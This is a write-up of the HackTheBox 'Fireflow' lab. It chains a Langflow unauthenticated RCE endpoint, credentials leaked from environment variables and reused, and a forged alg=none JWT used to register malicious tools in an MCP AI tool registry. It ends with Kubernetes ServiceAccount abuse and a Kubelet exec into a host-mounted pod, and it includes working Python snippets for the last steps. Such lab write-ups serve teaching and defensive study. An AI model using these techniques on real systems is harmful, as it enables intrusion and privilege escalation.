# HackTheBox Fireflow Full Chain Penetration Testing

## External Reconnaissance and Web Entry
- Target resolved to `flow.fireflow.htb`
- Web application identified as Langflow `1.8.2`

## `CVE-2026-33017` — Langflow RCE
- Langflow `1.8.2` vulnerable to unauthenticated RCE via:
```http
POST /api/v1/build_public_tmp/{flow_id}/flow
```
- Public flow ID used: `7d84d636-af65-42e4-ac38-26e867052c25`
- Exploit succeeded, gaining RCE as `www-data`

## Credential Discovery and Lateral Movement (`www-data` -> `nightfall`)
- Environment variables of the Langflow process revealed:
```text
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
```
- Password reuse: same credential worked for the system account `nightfall`, giving an SSH shell
```bash
id #uid=1000(nightfall) gid=1000(nightfall) groups=1000(nightfall)
```
- `sudo -l` required a password, so sudo-based escalation could not be confirmed

## Local Enumeration as `nightfall`
- `~/.mcp/config.json` contained credentials for an MCP AI Tool Registry:
```json
{
  "server": "http://10.129.244.214:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "LangfXXXXX"
}
```

## MCP Vulnerability — JWT `alg=none`
- `/api/v1/version` showed support for both `HS256` and `none` JWT algorithms
- Forged an unsigned JWT declaring role `admin`
- Registered a custom MCP tool with the forged token and executed Python code, confirming RCE inside the MCP container

## Kubernetes Enumeration
- Registered a read-only `kube_enum` MCP tool to query the Kubernetes API with the pod's own ServiceAccount token:
```python
token = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
api = "https://" + os.environ.get("KUBERNETES_SERVICE_HOST", "10.43.0.1") + ":443"

review = request("/apis/authorization.k8s.io/v1/selfsubjectrulesreviews", "POST", {
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectRulesReview",
    "spec": {"namespace": "default"}
})
pods = request("/api/v1/nodes/fireflow/proxy/pods")
```
- `SelfSubjectRulesReview` revealed `get` permission on `nodes/proxy`
- Pod listing found `prometheus-prometheus-node-exporter-nmntq` in namespace `monitoring`, running with `hostPID: true`, `hostNetwork: true`, and mounting the host root filesystem at `/host/root` (read-only)

## Privilege Escalation
- Registered a second MCP tool, `kubelet_test`, to exec directly into the `node-exporter` container via the Kubelet API on port `10250`, authenticating with the same ServiceAccount token over a WebSocket:
```python
NODE, NAMESPACE, POD, CONTAINER = (
    "10.129.244.214", "monitoring",
    "prometheus-prometheus-node-exporter-nmntq", "node-exporter"
)
command = ["/bin/sh", "-c", "cat /host/root/root/root.txt"]
args = "&".join("command=" + quote(part, safe="") for part in command)
url = f"wss://{NODE}:10250/exec/{NAMESPACE}/{POD}/{CONTAINER}?output=1&error=1&{args}"

async with websockets.connect(
    url, ssl=ctx,
    additional_headers={"Authorization": "Bearer " + token},
    subprotocols=["v4.channel.k8s.io"]
) as ws:
    ...
```
- `/root/root.txt` extraction via the `node-exporter` pod's host bind mount
